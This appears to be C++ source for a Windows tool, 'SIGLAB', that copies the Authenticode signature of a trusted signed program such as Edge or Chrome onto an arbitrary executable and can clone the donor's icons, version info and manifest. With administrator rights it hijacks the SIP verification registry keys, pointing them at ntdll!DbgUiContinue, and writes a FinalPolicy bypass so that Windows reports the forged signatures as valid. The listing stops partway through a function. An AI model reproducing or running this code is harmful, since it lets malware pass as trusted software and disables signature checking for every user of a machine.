#include "pe_signature.h"
#include "sip_registry.h"
#include "pkcs7_payload.h"

#include <algorithm>
#include <cctype>
#include <cmath>
#include <cstdio>
#include <cstring>
#include <filesystem>
#include <iostream>
#include <string>
#include <vector>

#include <shellapi.h>

namespace fs = std::filesystem;

// ---------------------------------------------------------------------------
// Console / colour helpers
// ---------------------------------------------------------------------------

namespace ui {

HANDLE g_console = INVALID_HANDLE_VALUE;
bool g_ansi = false;
bool g_eof = false;
bool g_minimal = false;
bool g_errorShown = false;

enum class Tone {
    Normal,
    Dim,
    Cyan,
    Green,
    Yellow,
    Red,
    Magenta,
    Blue,
    White
};

void SetMinimal(bool minimal) {
    g_minimal = minimal;
}

bool Minimal() {
    return g_minimal;
}

bool ErrorShown() {
    return g_errorShown;
}

void Init() {
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);
    SetConsoleTitleW(L"SIGLAB  ");

    g_console = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD mode = 0;
    if (g_console != INVALID_HANDLE_VALUE && GetConsoleMode(g_console, &mode)) {
        g_ansi = SetConsoleMode(g_console,
                                mode | ENABLE_PROCESSED_OUTPUT |
                                ENABLE_VIRTUAL_TERMINAL_PROCESSING) != 0;
    }
}

WORD FallbackAttribute(Tone tone) {
    switch (tone) {
    case Tone::Dim:     return FOREGROUND_INTENSITY;
    case Tone::Cyan:    return FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY;
    case Tone::Green:   return FOREGROUND_GREEN | FOREGROUND_INTENSITY;
    case Tone::Yellow:  return FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY;
    case Tone::Red:     return FOREGROUND_RED | FOREGROUND_INTENSITY;
    case Tone::Magenta: return FOREGROUND_RED | FOREGROUND_BLUE | FOREGROUND_INTENSITY;
    case Tone::Blue:    return FOREGROUND_BLUE | FOREGROUND_INTENSITY;
    case Tone::White:   return FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE |
                               FOREGROUND_INTENSITY;
    case Tone::Normal:
    default:            return FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE;
    }
}

void SetTone(Tone tone) {
    if (g_ansi) {
        const char* code = "\x1b[0m";
        switch (tone) {
        case Tone::Dim:     code = "\x1b[38;2;120;132;150m"; break;
        case Tone::Cyan:    code = "\x1b[38;2;0;220;255m";   break;
        case Tone::Green:   code = "\x1b[38;2;80;230;140m";  break;
        case Tone::Yellow:  code = "\x1b[38;2;255;210;80m";  break;
        case Tone::Red:     code = "\x1b[38;2;255;95;95m";   break;
        case Tone::Magenta: code = "\x1b[38;2;235;90;255m";  break;
        case Tone::Blue:    code = "\x1b[38;2;110;160;255m"; break;
        case Tone::White:   code = "\x1b[38;2;235;240;250m"; break;
        case Tone::Normal:
        default:            code = "\x1b[0m";                break;
        }
        std::cout << code;
    } else if (g_console != INVALID_HANDLE_VALUE) {
        SetConsoleTextAttribute(g_console, FallbackAttribute(tone));
    }
}

void Reset() {
    if (g_ansi) {
        std::cout << "\x1b[0m";
    } else if (g_console != INVALID_HANDLE_VALUE) {
        SetConsoleTextAttribute(g_console, FallbackAttribute(Tone::Normal));
    }
}

void SetRgb(int r, int g, int b) {
    if (g_ansi) {
        std::cout << "\x1b[38;2;" << r << ';' << g << ';' << b << "m";
    } else if (g_console != INVALID_HANDLE_VALUE) {
        const int brightness = (r + g + b) / 3;
        WORD attribute = 0;
        if (brightness > 60) attribute |= FOREGROUND_INTENSITY;
        if (r > 100) attribute |= FOREGROUND_RED;
        if (g > 100) attribute |= FOREGROUND_GREEN;
        if (b > 100) attribute |= FOREGROUND_BLUE;
        if (!attribute) attribute = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE;
        SetConsoleTextAttribute(g_console, attribute);
    }
}

std::string WToU8(const std::wstring& text) {
    if (text.empty()) return {};
    const int bytes = WideCharToMultiByte(CP_UTF8, 0, text.data(),
                                          static_cast<int>(text.size()),
                                          nullptr, 0, nullptr, nullptr);
    if (bytes <= 0) return {};
    std::string output(static_cast<size_t>(bytes), '\0');
    WideCharToMultiByte(CP_UTF8, 0, text.data(), static_cast<int>(text.size()),
                        output.data(), bytes, nullptr, nullptr);
    return output;
}

std::wstring U8ToW(const std::string& text) {
    if (text.empty()) return {};
    const int chars = MultiByteToWideChar(CP_UTF8, 0, text.data(),
                                         static_cast<int>(text.size()),
                                         nullptr, 0);
    if (chars <= 0) return {};
    std::wstring output(static_cast<size_t>(chars), L'\0');
    MultiByteToWideChar(CP_UTF8, 0, text.data(), static_cast<int>(text.size()),
                        output.data(), chars);
    return output;
}

void Print(Tone tone, const std::string& text) {
    SetTone(tone);
    std::cout << text;
    Reset();
}

void PrintLine(Tone tone, const std::string& text) {
    Print(tone, text);
    std::cout << '\n';
}

void Error(const std::string& text) {
    g_errorShown = true;
    Print(Tone::Red, "  [!] ");
    std::cout << text << '\n';
}

void Warn(const std::string& text) {
    if (g_minimal) return;
    Print(Tone::Yellow, "  [!] ");
    std::cout << text << '\n';
}

void Info(const std::string& text) {
    if (g_minimal) return;
    Print(Tone::Cyan, "  [*] ");
    std::cout << text << '\n';
}

void Ok(const std::string& text) {
    if (g_minimal) return;
    Print(Tone::Green, "  [+] ");
    std::cout << text << '\n';
}

void Rule(const std::string& title) {
    if (g_minimal) return;
    std::cout << '\n';
    Print(Tone::Dim, "  ----------------------------------------------------------------------\n");
    Print(Tone::Cyan, "  " + title + "\n");
    Print(Tone::Dim, "  ----------------------------------------------------------------------\n");
}

} // namespace ui

// ---------------------------------------------------------------------------
// Text / path helpers
// ---------------------------------------------------------------------------

std::string Trim(std::string text) {
    auto isSpace = [](unsigned char c) { return std::isspace(c) != 0; };
    while (!text.empty() && isSpace(static_cast<unsigned char>(text.front()))) {
        text.erase(text.begin());
    }
    while (!text.empty() && isSpace(static_cast<unsigned char>(text.back()))) {
        text.pop_back();
    }
    return text;
}

std::string StripQuotes(std::string text) {
    if (text.size() >= 2) {
        const char first = text.front();
        const char last = text.back();
        if ((first == '"' && last == '"') || (first == '\'' && last == '\'')) {
            text = text.substr(1, text.size() - 2);
        }
    }
    return text;
}

std::wstring ExpandEnvironment(const std::wstring& input) {
    const DWORD needed = ExpandEnvironmentStringsW(input.c_str(), nullptr, 0);
    if (!needed) return input;

    std::wstring output(static_cast<size_t>(needed), L'\0');
    const DWORD written = ExpandEnvironmentStringsW(input.c_str(), output.data(), needed);
    if (!written || written > needed) return input;

    output.resize(static_cast<size_t>(written - 1));
    return output;
}

bool ReadInput(const std::string& prompt, std::string& output) {
    std::cout << prompt << std::flush;
    if (!std::getline(std::cin, output)) {
        ui::g_eof = true;
        std::cout << '\n';
        return false;
    }
    output = Trim(output);
    return true;
}

bool PromptPath(const std::string& prompt, std::wstring& path) {
    std::string input;
    if (!ReadInput(prompt, input)) return false;
    if (input.empty()) return false;
    path = ExpandEnvironment(ui::U8ToW(StripQuotes(input)));
    return !path.empty();
}

bool PromptExistingFile(const std::string& prompt, std::wstring& path) {
    if (!PromptPath(prompt, path)) return false;

    std::error_code ec;
    if (!fs::is_regular_file(path, ec)) {
        ui::Error("File does not exist or is not a regular file.");
        return false;
    }
    return true;
}

std::wstring PromptOptionalPath(const std::string& prompt, const std::wstring& defaultPath) {
    std::string input;
    if (!ReadInput(prompt, input) || input.empty()) return defaultPath;
    return ExpandEnvironment(ui::U8ToW(StripQuotes(input)));
}

int PromptChoice(const std::string& prompt, int minimum, int maximum, int fallback) {
    while (!ui::g_eof) {
        std::string input;
        if (!ReadInput(prompt, input)) return fallback;
        if (input.empty()) return fallback;
        try {
            const int value = std::stoi(input);
            if (value >= minimum && value <= maximum) return value;
        } catch (...) {
        }
        ui::Warn("Invalid choice.");
    }
    return fallback;
}

bool Confirm(const std::string& prompt, bool defaultYes) {
    std::string input;
    if (!ReadInput(prompt, input)) return false;
    if (input.empty()) return defaultYes;
    return std::tolower(static_cast<unsigned char>(input.front())) == 'y';
}

// ---------------------------------------------------------------------------
// Banner
// ---------------------------------------------------------------------------

namespace art {

const wchar_t* const kGlyphs[8][6] = {
    // D
    {L"██████╗ ", L"██╔══██╗", L"██║  ██║", L"██║  ██║", L"██████╔╝", L"╚═════╝ "},
    // E
    {L"███████╗", L"██╔════╝", L"█████╗  ", L"██╔══╝  ", L"███████╗", L"╚══════╝"},
    // T
    {L"████████╗", L"╚══██╔══╝", L"   ██║   ", L"   ██║   ", L"   ██║   ", L"   ╚═╝   "},
    // E
    {L"███████╗", L"██╔════╝", L"█████╗  ", L"██╔══╝  ", L"███████╗", L"╚══════╝"},
    // C
    {L" ██████╗ ", L"██╔════╝", L"██║     ", L"██║     ", L"╚██████╗", L" ╚═════╝ "},
    // T
    {L"████████╗", L"╚══██╔══╝", L"   ██║   ", L"   ██║   ", L"   ██║   ", L"   ╚═╝   "},
    // O
    {L" ██████╗ ", L"██╔═══██╗", L"██║   ██║", L"██║   ██║", L"╚██████╔╝", L" ╚═════╝ "},
    // R
    {L"██████╗ ", L"██╔══██╗", L"██████╔╝", L"██╔══██╗", L"██║  ██║", L"╚═╝  ╚═╝"},
};

void HsvToRgb(double hue, double saturation, double value,
              int& red, int& green, int& blue) {
    const double c = value * saturation;
    const double x = c * (1.0 - std::fabs(std::fmod(hue / 60.0, 2.0) - 1.0));
    const double m = value - c;

    double r = 0.0, g = 0.0, b = 0.0;
    if (hue < 60.0)       { r = c; g = x; }
    else if (hue < 120.0) { r = x; g = c; }
    else if (hue < 180.0) { g = c; b = x; }
    else if (hue < 240.0) { g = x; b = c; }
    else if (hue < 300.0) { r = x; b = c; }
    else                  { r = c; b = x; }

    red = static_cast<int>((r + m) * 255.0);
    green = static_cast<int>((g + m) * 255.0);
    blue = static_cast<int>((b + m) * 255.0);
}

void PrintBanner() {
    std::cout << '\n';
    for (int row = 0; row < 6; ++row) {
        std::cout << "   ";
        for (int glyph = 0; glyph < 8; ++glyph) {
            const double t = static_cast<double>(row * 8 + glyph) / 47.0;
            const double hue = 185.0 + 135.0 * t; // cyan -> magenta
            int red = 0, green = 0, blue = 0;
            HsvToRgb(hue, 0.82, 1.0, red, green, blue);
            ui::SetRgb(red, green, blue);

            std::wstring cell = kGlyphs[glyph][row];
            cell.resize(9, L' ');
            std::cout << ui::WToU8(cell);
        }
        ui::Reset();
        std::cout << '\n';
    }

    std::cout << '\n';
    ui::Print(ui::Tone::Cyan, "           SIGNATURE TOOLKIT");
    ui::Print(ui::Tone::Dim, "  |  ");
    ui::Print(ui::Tone::Blue, "SECURITY CONSOLE");
    std::cout << "\n\n";
}

} // namespace art

// ---------------------------------------------------------------------------
// Environment / file helpers
// ---------------------------------------------------------------------------

bool IsRunningAsAdmin() {
    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY authority = SECURITY_NT_AUTHORITY;
    PSID administrators = nullptr;

    if (AllocateAndInitializeSid(&authority, 2,
                                 SECURITY_BUILTIN_DOMAIN_RID,
                                 DOMAIN_ALIAS_RID_ADMINS,
                                 0, 0, 0, 0, 0, 0,
                                 &administrators)) {
        CheckTokenMembership(nullptr, administrators, &isAdmin);
        FreeSid(administrators);
    }
    return isAdmin != FALSE;
}

// Re-launch the current process with the Administrator token (UAC). Returns the
// child exit code, or -1 when the user cancels UAC / elevation cannot start.
int RelaunchElevated() {
    wchar_t module[MAX_PATH] = {};
    if (!GetModuleFileNameW(nullptr, module, MAX_PATH)) return -1;

    // Keep the exact original command line (minus argv[0]) so quoted paths and
    // Unicode arguments survive the round trip. Append --no-elevate so the
    // elevated child can never start another elevation loop.
    const std::wstring commandLine = GetCommandLineW();
    std::wstring parameters;
    if (!commandLine.empty() && commandLine[0] == L'"') {
        const size_t close = commandLine.find(L'"', 1);
        if (close != std::wstring::npos) parameters = commandLine.substr(close + 1);
    } else {
        const size_t space = commandLine.find(L' ');
        if (space != std::wstring::npos) parameters = commandLine.substr(space + 1);
    }
    parameters += L" --no-elevate";

    SHELLEXECUTEINFOW info{};
    info.cbSize = sizeof(info);
    info.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_NOASYNC;
    info.lpVerb = L"runas";
    info.lpFile = module;
    info.lpParameters = parameters.c_str();
    info.nShow = SW_SHOWNORMAL;

    if (!ShellExecuteExW(&info) || !info.hProcess) {
        return -1;
    }

    WaitForSingleObject(info.hProcess, INFINITE);
    DWORD exitCode = 0;
    GetExitCodeProcess(info.hProcess, &exitCode);
    CloseHandle(info.hProcess);
    return static_cast<int>(exitCode);
}

// Keep the window open when the tool was started by double-clicking the EXE
// (the console belongs to this process only). Piped / scripted runs are not
// affected.
void PauseIfOwnConsole() {
    DWORD processes[4] = {};
    if (GetConsoleProcessList(processes, 4) != 1) return;

    std::cout << "\n  Press Enter to close...";
    std::string line;
    std::getline(std::cin, line);
}

std::string MachineName(uint16_t machine) {
    switch (machine) {
    case IMAGE_FILE_MACHINE_I386:  return "x86";
    case IMAGE_FILE_MACHINE_AMD64: return "x64";
    case IMAGE_FILE_MACHINE_ARM64: return "ARM64";
    case IMAGE_FILE_MACHINE_ARMNT: return "ARM";
    default: {
        char buffer[16] = {};
        std::snprintf(buffer, sizeof(buffer), "0x%04X", machine);
        return buffer;
    }
    }
}

std::string FormatBytes(uint64_t bytes) {
    char buffer[64] = {};
    if (bytes >= 1024ULL * 1024ULL) {
        std::snprintf(buffer, sizeof(buffer), "%.2f MB",
                      static_cast<double>(bytes) / (1024.0 * 1024.0));
    } else if (bytes >= 1024ULL) {
        std::snprintf(buffer, sizeof(buffer), "%.2f KB",
                      static_cast<double>(bytes) / 1024.0);
    } else {
        std::snprintf(buffer, sizeof(buffer), "%llu bytes",
                      static_cast<unsigned long long>(bytes));
    }
    return buffer;
}

std::wstring UniqueSiblingPath(const std::wstring& target,
                               const std::wstring& suffix,
                               const std::wstring& extensionOverride = L"") {
    const fs::path path(target);
    const fs::path directory = path.parent_path();
    const std::wstring stem = path.stem().wstring();
    const std::wstring extension = extensionOverride.empty()
                                       ? path.extension().wstring()
                                       : extensionOverride;

    fs::path candidate = directory / (stem + suffix + extension);
    int counter = 2;
    std::error_code ec;
    while (fs::exists(candidate, ec)) {
        candidate = directory / (stem + suffix + std::to_wstring(counter) + extension);
        ++counter;
    }
    return candidate.wstring();
}

std::wstring MakeBackupPath(const std::wstring& target) {
    std::error_code ec;
    fs::path directory = fs::temp_directory_path(ec);
    if (ec) directory = fs::path(target).parent_path();

    const fs::path targetPath(target);
    const std::wstring base = L"siglab_backup_" +
                              std::to_wstring(GetCurrentProcessId()) + L"_" +
                              std::to_wstring(GetTickCount64());
    const std::wstring extension = targetPath.extension().wstring();

    fs::path candidate = directory / (base + extension);
    int counter = 2;
    while (fs::exists(candidate, ec)) {
        candidate = directory / (base + L"_" + std::to_wstring(counter) + extension);
        ++counter;
    }
    return candidate.wstring();
}

// ---------------------------------------------------------------------------
// Donor selection
// ---------------------------------------------------------------------------

std::wstring FindDefaultDonor() {
    // Windows inbox files are often catalog-signed, so they have no embedded
    // certificate table. Use a third-party EXE with an embedded signature.
    const wchar_t* candidates[] = {
        L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        L"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
        L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
        L"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\devenv.exe",
        L"C:\\Program Files\\Microsoft Visual Studio\\2022\\Professional\\Common7\\IDE\\devenv.exe",
        L"C:\\Program Files\\Microsoft Visual Studio\\2022\\Enterprise\\Common7\\IDE\\devenv.exe",
        L"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\Common7\\IDE\\devenv.exe",
        L"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Professional\\Common7\\IDE\\devenv.exe",
        L"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Enterprise\\Common7\\IDE\\devenv.exe",
    };

    for (const wchar_t* candidate : candidates) {
        std::error_code ec;
        if (!fs::is_regular_file(candidate, ec)) continue;
        const pesign::PeInfo info = pesign::InspectPe(candidate);
        if (info.valid && pesign::HasSignature(info)) {
            return candidate;
        }
    }
    return L"";
}

std::wstring AskDonor() {
    while (!ui::g_eof) {
        std::wstring path;
        if (!PromptPath("  Donor signed EXE/DLL: ", path)) {
            return L"";
        }

        std::error_code ec;
        if (!fs::is_regular_file(path, ec)) {
            ui::Error("Donor file does not exist.");
            continue;
        }

        const pesign::PeInfo info = pesign::InspectPe(path);
        if (!info.valid || !pesign::HasSignature(info)) {
            ui::Error("Donor has no embedded Authenticode signature. "
                      "Use Edge, Chrome, Visual Studio, or another third-party signed file.");
            continue;
        }
        return path;
    }
    return L"";
}

// ---------------------------------------------------------------------------
// Sign / graft
// ---------------------------------------------------------------------------

void PrintFileFacts(const pesign::PeInfo& info) {
    ui::Print(ui::Tone::Dim, "  Format    : ");
    std::cout << (info.pe32plus ? "PE32+" : "PE32")
              << " (" << MachineName(info.machine) << ")\n";

    ui::Print(ui::Tone::Dim, "  Size      : ");
    std::cout << FormatBytes(info.fileSize) << " (" << info.fileSize << " bytes)\n";

    ui::Print(ui::Tone::Dim, "  Signature : ");
    if (pesign::HasSignature(info)) {
        ui::Print(ui::Tone::Yellow, "present (will be replaced)\n");
    } else {
        ui::Print(ui::Tone::Dim, "not present\n");
    }
}

std::string ShortVerifyStatus(const pesign::VerifyResult& result) {
    if (result.valid()) return "VALID";
    switch (static_cast<DWORD>(result.status)) {
    case TRUST_E_BAD_DIGEST:
        return "HashMismatch";
    case TRUST_E_NOSIGNATURE:
    case TRUST_E_SUBJECT_FORM_UNKNOWN:
    case TRUST_E_PROVIDER_UNKNOWN:
        return "NoSignature";
    case CERT_E_UNTRUSTEDROOT:
        return "UntrustedRoot";
    case CERT_E_EXPIRED:
        return "Expired";
    case CERT_E_REVOKED:
        return "Revoked";
    default:
        break;
    }

    char buffer[24] = {};
    std::snprintf(buffer, sizeof(buffer), "0x%08lX",
                  static_cast<unsigned long>(result.status));
    return buffer;
}

enum class BypassState {
    NotAttempted,
    Installed,
    Failed
};

void PrintSignResult(const std::wstring& path, bool inPlace,
                     int freshStatus = -1,
                     BypassState bypassState = BypassState::NotAttempted) {
    const std::wstring signer = pesign::GetSignerName(path);

    std::cout << '\n';
    ui::Print(ui::Tone::Dim, "  File   : ");
    std::cout << ui::WToU8(path);
    if (inPlace) std::cout << "  (modified in place)";
    std::cout << '\n';

    ui::Print(ui::Tone::Dim, "  Signer : ");
    ui::Print(ui::Tone::White, signer.empty() ? "(could not read)" : ui::WToU8(signer));
    std::cout << '\n';

    ui::Print(ui::Tone::Dim, "  Verify : ");

    if (freshStatus == 0) {
        ui::Print(ui::Tone::Green, "VALID (fresh process)\n");
        return;
    }

    if (freshStatus == 2) {
        ui::Print(ui::Tone::Yellow, "HashMismatch (fresh process)\n");
        if (bypassState == BypassState::Installed) {
            ui::Print(ui::Tone::Dim,
                      "           Bypass is installed, but verification still failed. Reboot / log off\n");
            ui::Print(ui::Tone::Dim,
                      "           or check HVCI / Smart App Control with --probe.\n");
        } else if (bypassState == BypassState::Failed) {
            ui::Print(ui::Tone::Dim,
                      "           Bypass installation failed. Check the errors above and run as Administrator.\n");
        } else {
            ui::Print(ui::Tone::Dim,
                      "           Run SigLab as Administrator to install the registry bypass.\n");
        }
        return;
    }

    if (freshStatus > 0) {
        ui::Print(ui::Tone::Yellow, "Could not verify in a fresh process\n");
        return;
    }

    const pesign::VerifyResult verify = pesign::VerifyFile(path);
    if (verify.valid()) {
        ui::Print(ui::Tone::Green, "VALID\n");
    } else if (verify.status == TRUST_E_BAD_DIGEST) {
        ui::Print(ui::Tone::Yellow, "HashMismatch\n");
        ui::Print(ui::Tone::Dim,
                  "           Expected for a grafted signature. Run as Administrator to install\n");
        ui::Print(ui::Tone::Dim,
                  "           the auto bypass, or use the Bypass menu.\n");
    } else {
        ui::Print(ui::Tone::Yellow, ShortVerifyStatus(verify) + "\n");
    }
}

std::wstring ReadHklmString(const std::wstring& subkey, const wchar_t* value, REGSAM view);

bool SipKeyActive(const SipEntry& sip) {
    const std::wstring subkey =
        L"SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\" +
        std::wstring(sip.guid);

    auto check = [&](REGSAM view) {
        return ReadHklmString(subkey, L"Dll", view) ==
                   L"C:\\Windows\\System32\\ntdll.dll" &&
               ReadHklmString(subkey, L"FuncName", view) == L"DbgUiContinue";
    };

    return check(KEY_WOW64_64KEY) && check(KEY_WOW64_32KEY);
}

bool ApplyLabBypass() {
    if (!IsRunningAsAdmin()) {
        ui::Warn("Registry bypass skipped: not running as Administrator.");
        return false;
    }

    ui::Info("Applying automatic lab bypass...");
    const std::vector<SipEntry> sips = resolve_sip_types("", false, true);

    const bool sipWriteOk = install_sip_bypass(sips, false);
    const bool policyOk = bypass_finalpolicy();

    int active = 0;
    for (const auto& sip : sips) {
        if (SipKeyActive(sip)) ++active;
    }

    const int total = static_cast<int>(sips.size());
    const bool peActive = !sips.empty() && SipKeyActive(sips.front());

    if (peActive && active == total && sipWriteOk) {
        ui::Ok("SIP bypass installed (all 19, 64-bit + 32-bit).");
    } else if (peActive) {
        ui::Ok("SIP bypass active for PE (" + std::to_string(active) + "/" +
               std::to_string(total) + " types, both views).");
        ui::Warn("Windows protected the remaining SIP keys (for example ESD); they were left unchanged.");
        if (!ui::Minimal()) {
            ui::Print(ui::Tone::Dim,
                      "      PE signature verification is not affected.\n");
        }
    } else {
        ui::Warn("PE SIP bypass could not be installed.");
    }

    if (policyOk) {
        ui::Ok("FinalPolicy bypass installed (64-bit + 32-bit).");
    } else {
        ui::Warn("FinalPolicy bypass could not be written.");
    }

    return peActive && policyOk;
}

DWORD VerifyInNewProcess(const std::wstring& path) {
    wchar_t module[MAX_PATH] = {};
    if (!GetModuleFileNameW(nullptr, module, MAX_PATH)) {
        return 3;
    }

    std::wstring commandLine = L"\"" + std::wstring(module) +
                               L"\" --verify-quiet \"" + path + L"\"";

    STARTUPINFOW startup{};
    startup.cb = sizeof(startup);
    PROCESS_INFORMATION process{};

    const BOOL created = CreateProcessW(module, commandLine.data(),
                                        nullptr, nullptr, FALSE,
                                        CREATE_NO_WINDOW, nullptr, nullptr,
                                        &startup, &process);
    if (!created) {
        return 3;
    }

    const DWORD wait = WaitForSingleObject(process.hProcess, 30000);
    DWORD exitCode = 3;
    if (wait == WAIT_OBJECT_0) {
        GetExitCodeProcess(process.hProcess, &exitCode);
    } else {
        TerminateProcess(process.hProcess, 3);
    }

    CloseHandle(process.hThread);
    CloseHandle(process.hProcess);
    return exitCode;
}

int VerifyCommand(const std::wstring& path, bool quiet) {
    const pesign::PeInfo info = pesign::InspectPe(path);
    if (!info.valid) {
        if (!quiet) ui::Error("Not a valid PE file: " + ui::WToU8(info.error));
        return 3;
    }

    const pesign::VerifyResult result = pesign::VerifyFile(path);

    if (!quiet) {
        const std::wstring signer = pesign::GetSignerName(path);
        std::cout << '\n';
        ui::Print(ui::Tone::Dim, "  File   : ");
        std::cout << ui::WToU8(path) << '\n';
        ui::Print(ui::Tone::Dim, "  Signer : ");
        ui::Print(ui::Tone::White, signer.empty() ? "(could not read)" : ui::WToU8(signer));
        std::cout << '\n';
        ui::Print(ui::Tone::Dim, "  Verify : ");
        if (result.valid()) {
            ui::Print(ui::Tone::Green, "VALID\n");
        } else if (result.status == TRUST_E_BAD_DIGEST) {
            ui::Print(ui::Tone::Yellow, "HashMismatch\n");
        } else {
            ui::Print(ui::Tone::Yellow, ShortVerifyStatus(result) + "\n");
        }
    }

    if (result.valid()) return 0;
    if (result.status == TRUST_E_BAD_DIGEST) return 2;
    return 3;
}

void ProbeFlow();

void SignFlow(const std::wstring& presetTarget = L"",
              bool autoMode = false,
              bool copyMode = false,
              int* exitCode = nullptr,
              const std::wstring& presetDonor = L"") {
    if (exitCode) *exitCode = 3;

    if (ui::Minimal()) {
        ui::Print(ui::Tone::Cyan, "  [*] Initializing...\n");
    }

    ui::Rule(autoMode ? "AUTO SIGN  -  GRAFT + BYPASS + PROBE + VERIFY"
                      : "SIGN / GRAFT SIGNATURE");

    std::wstring target = presetTarget;
    if (target.empty()) {
        if (!PromptExistingFile("  Target file: ", target)) return;
    }

    const pesign::PeInfo targetInfo = pesign::InspectPe(target);
    if (!targetInfo.valid) {
        ui::Error("Not a valid PE file: " + ui::WToU8(targetInfo.error));
        return;
    }

    if (!ui::Minimal()) {
        std::cout << '\n';
        PrintFileFacts(targetInfo);
    }

    bool inPlace = !copyMode;
    if (!autoMode) {
        std::cout << "\n  [1] Modify the original file in place\n";
        std::cout << "  [2] Create a signed copy\n";
        const int mode = PromptChoice("  select [1]: ", 1, 2, 1);
        inPlace = (mode == 1);
    }

    std::wstring donor = presetDonor;
    if (autoMode) {
        if (donor.empty()) {
            ui::Info("Selecting donor signature automatically...");
            donor = FindDefaultDonor();
            if (donor.empty()) {
                ui::Warn("No embedded-signed donor found automatically.");
                donor = AskDonor();
            }
        }
    } else {
        std::cout << "\n  [1] Auto-select donor (Edge / Chrome / Visual Studio)\n";
        std::cout << "  [2] Enter donor path manually\n";
        const int donorMode = PromptChoice("  select [1]: ", 1, 2, 1);

        if (donorMode == 1) {
            donor = FindDefaultDonor();
            if (donor.empty()) {
                ui::Warn("No embedded-signed donor found automatically.");
                donor = AskDonor();
            }
        } else {
            donor = AskDonor();
        }
    }

    if (donor.empty()) {
        ui::Error("No donor signature available. Signing cancelled.");
        return;
    }

    std::error_code ec;
    if (fs::equivalent(donor, target, ec) && !ec) {
        ui::Error("Donor and target are the same file.");
        return;
    }

    const bool clone =
        autoMode ? false
                 : Confirm("\n  Clone donor version info / icons / manifest? [y/N]: ", false);
    const bool elevated = IsRunningAsAdmin();

    if (!ui::Minimal()) {
        std::cout << '\n';
        ui::Print(ui::Tone::Dim, "  Target : ");
        std::cout << ui::WToU8(target) << '\n';
        ui::Print(ui::Tone::Dim, "  Mode   : ");
        ui::Print(inPlace ? ui::Tone::Yellow : ui::Tone::Green,
                  inPlace ? "in place (original overwritten)\n" : "new signed copy\n");
        ui::Print(ui::Tone::Dim, "  Donor  : ");
        std::cout << ui::WToU8(donor) << '\n';
        ui::Print(ui::Tone::Dim, "  Clone  : ");
        std::cout << (clone ? "yes\n" : "no\n");
        ui::Print(ui::Tone::Dim, "  Bypass : ");
        if (elevated) {
            ui::Print(ui::Tone::Yellow, "SIP all 19 + FinalPolicy (auto)\n");
        } else {
            ui::Print(ui::Tone::Dim, "skipped (not Administrator)\n");
        }
    }

    if (inPlace) {
        ui::Warn("The original file will be modified. A temporary backup is used for rollback.");
        if (pesign::HasSignature(targetInfo)) {
            ui::Warn("The old signature bytes will remain orphaned; the new donor table replaces the pointer.");
        }
    }

    const std::string proceedPrompt =
        inPlace
            ? (elevated
                   ? "\n  Proceed with in-place signing + registry bypass? [y/N]: "
                   : "\n  Proceed with in-place signing? [y/N]: ")
            : (elevated
                   ? "\n  Proceed with signing + registry bypass? [Y/n]: "
                   : "\n  Proceed with signing? [Y/n]: ");

    if (!autoMode && !Confirm(proceedPrompt, !inPlace)) {
        ui::Info("Cancelled.");
        return;
    }

    std::wstring work = target;
    std::wstring output;
    std::wstring backup;

    if (inPlace) {
        backup = MakeBackupPath(target);
        if (backup.empty()) {
            ui::Error("Could not choose a temporary backup path. Aborting.");
            return;
        }
        fs::copy_file(target, backup, fs::copy_options::overwrite_existing, ec);
        if (ec) {
            ui::Error("Could not create temporary backup: " + ec.message());
            return;
        }
    } else {
        output = UniqueSiblingPath(target, L"_signed");
        fs::copy_file(target, output, fs::copy_options::none, ec);
        if (ec) {
            ui::Error("Could not create output copy: " + ec.message());
            return;
        }
        work = output;
    }

    auto fail = [&](const std::string& message) {
        ui::Error(message);
        if (inPlace) {
            if (!backup.empty()) {
                std::error_code restoreError;
                fs::copy_file(backup, target,
                              fs::copy_options::overwrite_existing, restoreError);
                if (restoreError) {
                    ui::Error("Restore failed. Backup kept at: " + ui::WToU8(backup));
                } else {
                    std::error_code removeError;
                    fs::remove(backup, removeError);
                    if (removeError) {
                        ui::Warn("Original restored; backup could not be removed: " +
                                 ui::WToU8(backup));
                    } else {
                        ui::Warn("Original file restored from the temporary backup.");
                    }
                }
            }
        } else if (!output.empty()) {
            std::error_code removeError;
            fs::remove(output, removeError);
            if (!removeError) ui::Warn("Partial output removed.");
        }
    };

    if (clone) {
        ui::Info("Cloning donor metadata...");
        std::wstring cloneError;
        if (!pesign::CloneMetadata(donor, work, cloneError)) {
            fail("Metadata clone failed: " + ui::WToU8(cloneError));
            return;
        }
        ui::Ok("Metadata cloned.");
    }

    if (ui::Minimal()) {
        ui::Print(ui::Tone::Cyan, "  [*] Signing the file...\n");
    }

    ui::Info("Grafting donor signature...");
    std::wstring graftError;
    if (!pesign::CopySignature(donor, work, graftError)) {
        fail("Signing failed: " + ui::WToU8(graftError));
        return;
    }

    if (inPlace && !backup.empty()) {
        std::error_code removeError;
        fs::remove(backup, removeError);
        if (removeError) {
            ui::Warn("Signed in place, but the temporary backup could not be removed: " +
                     ui::WToU8(backup));
        }
    }

    if (inPlace) {
        ui::Ok("Original file modified in place.");
    } else {
        ui::Ok("Signed copy created.");
        if (!ui::Minimal()) {
            ui::Print(ui::Tone::Dim, "  Output : ");
            std::cout << ui::WToU8(work) << '\n';
        }
    }

    BypassState bypassState = BypassState::NotAttempted;
    int freshStatus = -1;

    if (elevated) {
        const bool bypassOk = ApplyLabBypass();
        bypassState = bypassOk ? BypassState::Installed : BypassState::Failed;
    }

